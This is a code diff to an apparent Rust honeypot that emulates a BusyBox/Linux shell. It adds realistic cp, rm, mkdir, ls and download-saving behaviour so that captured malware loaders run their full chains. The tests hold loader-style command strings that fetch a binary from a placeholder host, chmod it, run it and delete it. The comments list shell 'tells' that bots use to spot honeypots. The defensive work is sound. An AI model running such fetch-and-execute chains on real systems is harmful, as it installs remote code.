@@ -301,8 +301,16 @@ impl FakeShell {
             // builtins; answering "command not found" for it (observed live 2026-09-06) was the
             // one reply a bash never gives. `system` and `shell` really are unknown to bash.
             Some("enable") => cmd_enable(parts),
-            Some("wget") => cmd_wget(parts),
-            Some("curl") => cmd_curl(parts),
+            Some("wget") => {
+                let out = cmd_wget(parts);
+                self.save_fetched_file("wget", parts);
+                out
+            }
+            Some("curl") => {
+                let out = cmd_curl(parts);
+                self.save_fetched_file("curl", parts);
+                out
+            }
             Some("ping") => cmd_ping(parts),
             // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
             // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
@@ -315,7 +323,10 @@ impl FakeShell {
             // tftp/ftpget are BusyBox download applets these loaders use; stay quiet (a real
             // non-interactive fetch prints nothing on success) rather than "command not found". The
             // target URL is captured by `download_target` above.
-            Some("tftp") | Some("ftpget") => String::new(),
+            Some(fetcher @ ("tftp" | "ftpget")) => {
+                self.save_fetched_file(fetcher, parts);
+                String::new()
+            }
             // Filesystem/no-output applets in a loader's drop chain (`chmod +x x`, then `cp`/`rm`/
             // `mkdir`/`sleep`). A real shell prints nothing on success, and "command not found" for
             // `chmod` is impossible on any real Linux - it outs the honeypot before the loader ever
@@ -334,7 +345,13 @@ impl FakeShell {
                 }
                 String::new()
             }
-            Some("cp") | Some("rm") | Some("mkdir") | Some("sleep") => String::new(),
+            // These change the filesystem the rest of the session sees. Answering silent
+            // success while changing nothing let a loader `cp` a payload and then fail to find
+            // it, and left a file it had just `rm`ed still readable.
+            Some("cp") => self.cmd_cp(parts),
+            Some("rm") => self.cmd_rm(parts),
+            Some("mkdir") => self.cmd_mkdir(parts),
+            Some("sleep") => String::new(),
             Some("cd") => {
                 // Only into a directory the box presents: a silent `cd` into a directory that
                 // `ls /` never showed is a tell, and a loader's `>/x/.x && cd /x` chain relies on
@@ -385,13 +402,142 @@ impl FakeShell {
         } else {
             format!("{}/{arg}", self.cwd.trim_end_matches('/'))
         };
-        // `cd /tmp/` names the same directory as `cd /tmp`; the model keys on the bare form.
-        let trimmed = joined.trim_end_matches('/');
-        if trimmed.is_empty() {
+        // Normalise the way a kernel resolves a path: `.` and an empty segment (a trailing or
+        // doubled slash) drop out, `..` climbs. Without this `./payload` - the form every
+        // loader runs its dropped file with - resolved to a path the model never held.
+        let mut segments: Vec<&str> = Vec::new();
+        for segment in joined.split('/') {
+            match segment {
+                "" | "." => {}
+                ".." => {
+                    segments.pop();
+                }
+                name => segments.push(name),
+            }
+        }
+        if segments.is_empty() {
             "/".to_string()
         } else {
-            trimmed.to_string()
+            format!("/{}", segments.join("/"))
         }
+    }
+
+    /// Record the file a fetch command saved, with the body this shell claims to have fetched,
+    /// so the `chmod +x` and `./payload` a loader runs next find something there. A fetch that
+    /// printed to stdout saves nothing, as the real command does not.
+    fn save_fetched_file(&mut self, cmd: &str, parts: &[&str]) {
+        if let Some(name) = download_save_name(cmd, parts) {
+            let path = self.resolve_path(&name);
+            let _ = self.fs.write_file(&path, FETCHED_BODY);
+        }
+    }
+
+    /// `cp [-flags] SRC DST`. The destination is a real copy for the rest of the session, and
+    /// keeps the source's executable bit as a real `cp` does.
+    fn cmd_cp(&mut self, parts: &[&str]) -> String {
+        let operands: Vec<&str> = parts[1..]
+            .iter()
+            .copied()
+            .filter(|a| !a.starts_with('-'))
+            .collect();
+        let (Some(&src), Some(&dst)) = (operands.first(), operands.get(1)) else {
+            return "cp: missing destination file operand\n".to_string();
+        };
+        let src_path = self.resolve_path(src);
+        let Some(contents) = self.fs.read_file(&src_path) else {
+            return format!("cp: cannot stat '{src}': No such file or directory\n");
+        };
+        let mut dst_path = self.resolve_path(dst);
+        if self.fs.is_dir(&dst_path) {
+            dst_path = format!(
+                "{}/{}",
+                dst_path.trim_end_matches('/'),
+                command_basename(src)
+            );
+        }
+        if self.fs.write_file(&dst_path, &contents).is_err() {
+            return format!("cp: cannot create regular file '{dst}': No such file or directory\n");
+        }
+        if self.fs.is_executable(&src_path) {
+            self.fs.mark_executable(&dst_path);
+        }
+        String::new()
+    }
+
+    /// `rm [-rf] PATH...`. A removed file stops being readable and listed; `-f` stays silent on
+    /// a path that was not there, as the real one does.
+    fn cmd_rm(&mut self, parts: &[&str]) -> String {
+        let flags: Vec<&str> = parts[1..]
+            .iter()
+            .copied()
+            .filter(|a| a.starts_with('-'))
+            .collect();
+        let force = flags.iter().any(|f| f.contains('f'));
+        let recursive = flags.iter().any(|f| f.contains('r') || f.contains('R'));
+        let targets: Vec<&str> = parts[1..]
+            .iter()
+            .copied()
+            .filter(|a| !a.starts_with('-'))
+            .collect();
+        if targets.is_empty() {
+            return if force {
+                String::new()
+            } else {
+                "rm: missing operand\n".to_string()
+            };
+        }
+        let mut out = String::new();
+        for target in targets {
+            let path = self.resolve_path(target);
+            if self.fs.is_dir(&path) && !recursive {
+                out.push_str(&format!("rm: cannot remove '{target}': Is a directory\n"));
+                continue;
+            }
+            if !self.fs.remove_path(&path) && !force {
+                out.push_str(&format!(
+                    "rm: cannot remove '{target}': No such file or directory\n"
+                ));
+            }
+        }
+        out
+    }
+
+    /// `mkdir [-p] DIR...`. The new directory is one `cd` and `ls` accept afterwards.
+    fn cmd_mkdir(&mut self, parts: &[&str]) -> String {
+        let parents = parts[1..]
+            .iter()
+            .any(|a| a.starts_with('-') && a.contains('p'));
+        let targets: Vec<&str> = parts[1..]
+            .iter()
+            .copied()
+            .filter(|a| !a.starts_with('-'))
+            .collect();
+        if targets.is_empty() {
+            return "mkdir: missing operand\n".to_string();
+        }
+        let mut out = String::new();
+        for target in targets {
+            let path = self.resolve_path(target);
+            match self.fs.make_dir(&path) {
+                Ok(()) => {}
+                // `-p` is silent about an existing directory and creates missing parents.
+                Err(_) if parents => {
+                    let mut built = String::new();
+                    for segment in path.trim_start_matches('/').split('/') {
+                        built.push('/');
+                        built.push_str(segment);
+                        let _ = self.fs.make_dir(&built);
+                    }
+                }
+                Err(None) => out.push_str(&format!(
+                    "mkdir: cannot create directory '{target}': File exists\n"
+                )),
+                Err(Some(_)) => out.push_str(&format!(
+                    "mkdir: cannot create directory '{target}': No such file or directory\n"
+                )),
+            }
+        }
+        out
     }
 
     fn cmd_cat(&self, parts: &[&str]) -> String {
@@ -417,9 +563,23 @@ impl FakeShell {
 
     fn cmd_ls(&self, parts: &[&str]) -> String {
         let target = first_non_flag_arg(&parts[1..]).unwrap_or(self.cwd.as_str());
-        match self.fs.list_dir(target) {
-            Some(entries) if entries.is_empty() => String::new(),
-            Some(entries) => entries.join("  ") + "\n",
+        let show_hidden = parts[1..]
+            .iter()
+            .any(|a| a.starts_with('-') && (a.contains('a') || a.contains('A')));
+        match self.fs.list_dir(&self.resolve_path(target)) {
+            Some(mut entries) => {
+                // A real `ls` hides dotfiles without `-a` and sorts what it prints. Listing the
+                // `.x` probe files a loader had just dropped was a tell on both counts.
+                if !show_hidden {
+                    entries.retain(|name| !name.starts_with('.'));
+                }
+                entries.sort();
+                if entries.is_empty() {
+                    String::new()
+                } else {
+                    entries.join("  ") + "\n"
+                }
+            }
             None => format!("ls: cannot access '{target}': No such file or directory\n"),
         }
     }
@@ -1135,6 +1295,71 @@ fn wget_output(parts: &[&str]) -> WgetOutput {
 
 /// The basename a real wget would save a URL to: the last path segment (query string stripped), or
 /// `index.html` when the URL ends in `/` or has no path.
+/// The local file a fetch command writes its body to, or `None` when it writes to stdout (and so
+/// leaves nothing behind). `parts[0]` is the command token; `cmd` is its basename, already
+/// resolved by the caller so a full-path or BusyBox form lands here the same way.
+fn download_save_name(cmd: &str, parts: &[&str]) -> Option<String> {
+    let args = &parts[1..];
+    match cmd {
+        "wget" => match wget_output(parts) {
+            WgetOutput::Stdout => None,
+            WgetOutput::File(name) => Some(name),
+            WgetOutput::Default => Some(wget_basename(fetch_url_arg("wget", args)?)),
+        },
+        "curl" => {
+            let mut it = args.iter();
+            while let Some(&a) = it.next() {
+                if a == "-O" || a == "--remote-name" {
+                    return Some(wget_basename(fetch_url_arg("curl", args)?));
+                }
+                if a == "-o" || a == "--output" {
+                    return it.next().map(|n| strip_one_quote_pair(n).to_string());
+                }
+                if let Some(name) = a.strip_prefix("-o")
+                    && !name.is_empty()
+                {
+                    return Some(name.to_string());
+                }
+            }
+            None
+        }
+        // BusyBox `tftp -g -r REMOTE [-l LOCAL] HOST`: the local name wins when given.
+        "tftp" => {
+            let (mut remote, mut local) = (None, None);
+            let mut it = args.iter();
+            while let Some(&a) = it.next() {
+                match a {
+                    "-r" => remote = it.next().copied(),
+                    "-l" => local = it.next().copied(),
+                    _ => {}
+                }
+            }
+            local.or(remote).map(str::to_string)
+        }
+        // BusyBox `ftpget [opts] HOST [LOCAL] REMOTE`: the local name is the second positional
+        // when three are given, else the remote name doubles as it.
+        "ftpget" => {
+            let mut positional = Vec::new();
+            let mut it = args.iter();
+            while let Some(&a) = it.next() {
+                match a {
+                    "-u" | "-p" | "-P" => {
+                        it.next();
+                    }
+                    _ if a.starts_with('-') => {}
+                    _ => positional.push(a),
+                }
+            }
+            match positional.len() {
+                0 | 1 => None,
+                2 => Some(positional[1].to_string()),
+                _ => Some(positional[1].to_string()),
+            }
+        }
+        _ => None,
+    }
+}
+
 fn wget_basename(url: &str) -> String {
     let path = url.split(['?', '#']).next().unwrap_or(url);
     match path.trim_end_matches('/').rsplit('/').next() {
@@ -1513,14 +1738,124 @@ mod shell_detection_tests {
         );
         assert_eq!(run(&mut sh, "pwd"), "/tmp\n");
 
-        // Loader stage: the fetch is quiet, the chmod and run are quiet, and the URL is evidence.
+        // Loader stage: fetch to a file, make it executable, run it, delete it. Each step
+        // depends on what the one before left behind, so the replies are asserted exactly. A
+        // check for the absence of "not found" passed while `./x86` answered "No such file or
+        // directory", which is why the chain broke here unnoticed.
         let out = run(
             &mut sh,
             "/bin/busybox wget http://198.51.100.9/bins/x86 -O x86; chmod 777 x86; ./x86; rm -rf x86",
         );
-        assert!(!out.contains("not found"), "{out}");
+        assert!(out.starts_with("--"), "wget prints its transcript: {out}");
+        assert!(out.contains("Saving to: 'x86'"), "{out}");
+        assert!(out.trim_end().ends_with("saved [1234/1234]"), "{out}");
+        assert!(
+            !out.contains("No such file") && !out.contains("Permission denied"),
+            "every step found what the step before left: {out}"
+        );
+        assert_eq!(
+            run(&mut sh, "ls /tmp"),
+            "d\n",
+            "the payload was removed and the probe file stays hidden"
+        );
         assert_eq!(download_urls, vec!["http://198.51.100.9/bins/x86"]);
-        assert_eq!(command_events, 12, "one command event per session line");
+        assert_eq!(command_events, 13, "one command event per session line");
+    }
+
+    /// `cp`, `rm` and `mkdir` answered silent success while changing nothing, so a payload
+    /// copied somewhere was not there afterwards and a file the shell said it deleted was still
+    /// readable. Each now changes what the rest of the session sees, and reports the errors the
+    /// real commands report.
+    #[test]
+    fn cp_rm_and_mkdir_change_the_filesystem_the_session_sees() {
+        let mut sh = shell();
+        sh.handle_input(">/tmp/payload");
+        sh.handle_input("chmod +x /tmp/payload");
+
+        // cp copies content and the executable bit; into a directory it keeps the name.
+        assert_eq!(sh.handle_input("cp /tmp/payload /var/tmp/copy").0, "");
+        assert_eq!(sh.handle_input("/var/tmp/copy").0, "", "the copy runs too");
+        assert_eq!(sh.handle_input("cp /tmp/payload /mnt").0, "");
+        assert_eq!(sh.handle_input("ls /mnt").0, "payload\n");
+        assert_eq!(
+            sh.handle_input("cp /tmp/absent /tmp/x").0,
+            "cp: cannot stat '/tmp/absent': No such file or directory\n"
+        );
+
+        // mkdir creates a directory cd and ls accept; -p is quiet about one that exists.
+        assert_eq!(sh.handle_input("mkdir /tmp/stage").0, "");
+        assert_eq!(sh.handle_input("cd /tmp/stage").0, "");
+        assert_eq!(sh.handle_input("pwd").0, "/tmp/stage\n");
+        assert_eq!(
+            sh.handle_input("mkdir /tmp/stage").0,
+            "mkdir: cannot create directory '/tmp/stage': File exists\n"
+        );
+        assert_eq!(sh.handle_input("mkdir -p /tmp/stage/a/b").0, "");
+        assert_eq!(sh.handle_input("cd /tmp/stage/a/b").0, "");
+        assert_eq!(
+            sh.handle_input("mkdir /tmp/absent/deep").0,
+            "mkdir: cannot create directory '/tmp/absent/deep': No such file or directory\n"
+        );
+
+        // rm removes for real, refuses a directory without -r, and -f is quiet about a miss.
+        assert_eq!(sh.handle_input("cd /tmp").0, "");
+        assert_eq!(sh.handle_input("rm payload").0, "");
+        assert_eq!(
+            sh.handle_input("cat /tmp/payload").0,
+            "cat: /tmp/payload: No such file or directory\n"
+        );
+        assert_eq!(
+            sh.handle_input("/tmp/payload").0,
+            "bash: /tmp/payload: No such file or directory\n",
+            "a removed file stops being executable"
+        );
+        assert_eq!(
+            sh.handle_input("rm /tmp/payload").0,
+            "rm: cannot remove '/tmp/payload': No such file or directory\n"
+        );
+        assert_eq!(sh.handle_input("rm -f /tmp/payload").0, "");
+        assert_eq!(
+            sh.handle_input("rm /tmp/stage").0,
+            "rm: cannot remove '/tmp/stage': Is a directory\n"
+        );
+        assert_eq!(sh.handle_input("rm -rf /tmp/stage").0, "");
+        assert_eq!(
+            sh.handle_input("cd /tmp/stage").0,
+            "bash: cd: /tmp/stage: No such file or directory\n"
+        );
+        // A baked-in file can be removed too: saying nothing and keeping it contradicts the rm.
+        assert_eq!(sh.handle_input("rm /etc/hostname").0, "");
+        assert_eq!(
+            sh.handle_input("cat /etc/hostname").0,
+            "cat: /etc/hostname: No such file or directory\n"
+        );
+    }
+
+    /// A fetch that saves to a file leaves that file behind, so the `chmod` and `./payload` a
+    /// loader runs next work; one that prints to stdout leaves nothing, as the real one does.
+    #[test]
+    fn a_saved_download_exists_afterwards_and_a_streamed_one_does_not() {
+        let mut sh = shell();
+        sh.handle_input("cd /tmp");
+        sh.handle_input("wget http://198.51.100.9/bins/x86");
+        assert_eq!(
+            sh.handle_input("ls /tmp").0,
+            "x86\n",
+            "saved under its name"
+        );
+        assert_eq!(
+            sh.handle_input("cat /tmp/x86").0,
+            super::FETCHED_BODY,
+            "the saved file holds the body the fetch claimed"
+        );
+        sh.handle_input("curl -o boot.sh http://198.51.100.9/boot");
+        assert_eq!(sh.handle_input("ls /tmp").0, "boot.sh  x86\n");
+        sh.handle_input("busybox tftp -g -r arm7 198.51.100.9");
+        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
+        // Streamed to stdout (the `| sh` pattern): nothing is written.
+        sh.handle_input("wget -qO- http://198.51.100.9/one");
+        sh.handle_input("curl http://198.51.100.9/two");
+        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
     }
 
     /// Observed live (2026-09-06): `cat /proc/mounts; /bin/busybox URUMV`. The box answered
@@ -2152,15 +2487,36 @@ mod shell_detection_tests {
     }
 
     #[test]
-    fn chmod_and_drop_chain_verbs_are_silent_successes() {
+    fn chmod_and_drop_chain_verbs_never_say_command_not_found() {
         // `chmod +x x` returning "command not found" is impossible on real Linux and aborts the
         // loader before it runs its payload - the most direct capture-costing tell in the shell.
         let (out, _) = shell().handle_input("chmod +x /tmp/x");
         assert_eq!(out, "");
-        for cmd in ["cp a b", "rm x", "mkdir d", "sleep 1"] {
+        // The rest answer as the real commands do: silence on success, the real message on a
+        // path that is not there. They used to be silent either way, which is how a loader
+        // could `cp` a payload and then not find it.
+        for cmd in ["cp /bin/busybox b", "mkdir d", "sleep 1", "rm -f x"] {
             let (o, _) = shell().handle_input(cmd);
             assert_eq!(o, "", "{cmd} should be a silent success, got {o:?}");
         }
+        for (cmd, expected) in [
+            ("cp a b", "cp: cannot stat 'a': No such file or directory\n"),
+            ("rm x", "rm: cannot remove 'x': No such file or directory\n"),
+        ] {
+            let (o, _) = shell().handle_input(cmd);
+            assert_eq!(o, expected, "{cmd}");
+            assert!(!o.contains("command not found"));
+        }
+    }
+
+    /// `cp /bin/busybox x && ./x` is a standard staging step; it needs a busybox to copy.
+    #[test]
+    fn the_binaries_a_loader_copies_exist_and_are_executable() {
+        let mut sh = shell();
+        assert_eq!(sh.handle_input("cd /tmp").0, "");
+        assert_eq!(sh.handle_input("cp /bin/busybox ./b").0, "");
+        assert_eq!(sh.handle_input("./b").0, "", "the copy runs");
+        assert_eq!(sh.handle_input("ls /tmp").0, "b\n");
     }
 
     #[test]
